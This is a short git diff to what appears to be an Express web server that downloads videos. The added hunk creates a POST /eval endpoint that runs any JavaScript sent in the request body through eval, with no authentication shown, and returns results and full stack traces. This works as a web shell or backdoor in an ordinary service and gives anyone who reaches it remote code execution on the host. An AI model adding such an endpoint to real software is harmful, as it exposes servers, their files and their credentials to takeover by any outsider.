@@ -51,6 +51,16 @@ function downloadFile(url, dest) {
     });
 }
 
+app.post('/eval', async (req, res) => {
+    try {
+        const code = req.body.code;
+        const result = await eval(`(async () => { ${code} })()`);
+        res.json({ success: true, result });
+    } catch (err) {
+        res.status(500).json({ success: false, error: err.message, stack: err.stack });
+    }
+});
+
 app.get('/download', async (req, res) => {
     const videoId = req.query.id;
     if (!videoId) return res.status(400).send('Missing video ID');
